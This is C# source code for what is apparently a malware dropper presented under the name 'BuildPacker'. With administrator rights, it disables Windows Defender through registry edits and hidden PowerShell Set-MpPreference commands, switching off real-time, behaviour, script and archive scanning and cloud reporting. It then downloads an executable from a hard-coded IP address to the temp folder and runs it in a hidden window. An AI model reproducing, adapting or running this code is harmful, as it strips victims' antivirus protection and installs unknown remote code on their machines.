using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Principal;
using Microsoft.Win32;

namespace BuildPacker;

internal class Program
{
	public class WDefender
	{
		public static void Disable()
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				RegistryEdit("SOFTWARE\\Microsoft\\Windows Defender\\Features", "TamperProtection", "0");
				RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1");
				RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1");
				RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1");
				RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
				CheckDefender();
			}
		}

		private static void RegistryEdit(string regPath, string name, string value)
		{
			try
			{
				using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree);
				if (registryKey == null)
				{
					Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
				}
				else if (registryKey.GetValue(name) != value)
				{
					registryKey.SetValue(name, value, RegistryValueKind.DWord);
				}
			}
			catch
			{
			}
		}

		private static void CheckDefender()
		{
			Process process = new Process
			{
				StartInfo = new ProcessStartInfo
				{
					FileName = "powershell",
					Arguments = "Get-MpPreference -verbose",
					UseShellExecute = false,
					RedirectStandardOutput = true,
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				}
			};
			process.Start();
			while (!process.StandardOutput.EndOfStream)
			{
				string text = process.StandardOutput.ReadLine();
				if (text.StartsWith("DisableRealtimeMonitoring") && text.EndsWith("False"))
				{
					RunPS("Set-MpPreference -DisableRealtimeMonitoring $true");
				}
				else if (text.StartsWith("DisableBehaviorMonitoring") && text.EndsWith("False"))
				{
					RunPS("Set-MpPreference -DisableBehaviorMonitoring $true");
				}
				else if (text.StartsWith("DisableBlockAtFirstSeen") && text.EndsWith("False"))
				{
					RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");
				}
				else if (text.StartsWith("DisableIOAVProtection") && text.EndsWith("False"))
				{
					RunPS("Set-MpPreference -DisableIOAVProtection $true");
				}
				else if (text.StartsWith("DisablePrivacyMode") && text.EndsWith("False"))
				{
					RunPS("Set-MpPreference -DisablePrivacyMode $true");
				}
				else if (text.StartsWith("SignatureDisableUpdateOnStartupWithoutEngine") && text.EndsWith("False"))
				{
					RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
				}
				else if (text.StartsWith("DisableArchiveScanning") && text.EndsWith("False"))
				{
					RunPS("Set-MpPreference -DisableArchiveScanning $true");
				}
				else if (text.StartsWith("DisableIntrusionPreventionSystem") && text.EndsWith("False"))
				{
					RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true");
				}
				else if (text.StartsWith("DisableScriptScanning") && text.EndsWith("False"))
				{
					RunPS("Set-MpPreference -DisableScriptScanning $true");
				}
				else if (text.StartsWith("SubmitSamplesConsent") && !text.EndsWith("2"))
				{
					RunPS("Set-MpPreference -SubmitSamplesConsent 2");
				}
				else if (text.StartsWith("MAPSReporting") && !text.EndsWith("0"))
				{
					RunPS("Set-MpPreference -MAPSReporting 0");
				}
				else if (text.StartsWith("HighThreatDefaultAction") && !text.EndsWith("6"))
				{
					RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force");
				}
				else if (text.StartsWith("ModerateThreatDefaultAction") && !text.EndsWith("6"))
				{
					RunPS("Set-MpPreference -ModerateThreatDefaultAction 6");
				}
				else if (text.StartsWith("LowThreatDefaultAction") && !text.EndsWith("6"))
				{
					RunPS("Set-MpPreference -LowThreatDefaultAction 6");
				}
				else if (text.StartsWith("SevereThreatDefaultAction") && !text.EndsWith("6"))
				{
					RunPS("Set-MpPreference -SevereThreatDefaultAction 6");
				}
			}
		}

		private static void RunPS(string args)
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				FileName = "powershell",
				Arguments = args,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true
			};
			process.Start();
		}
	}

	private static string Folder = Path.GetTempPath() + "\\Sbvc";

	private static void Main(string[] args)
	{
		Directory.CreateDirectory(Folder);
		WebClient webClient = new WebClient();
		Registry.CurrentUser.SetValue("user_svc", "4");
		string fileName = Path.Combine(Path.GetTempPath(), "sbvc.exe");
		try
		{
			WDefender.Disable();
		}
		catch
		{
		}
		webClient.DownloadFile(new Uri("http://178.154.251.1/files/Release.exe"), fileName);
		try
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = fileName,
				WindowStyle = ProcessWindowStyle.Hidden
			})!.WaitForExit();
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
		Directory.Delete(Folder, recursive: true);
	}
}
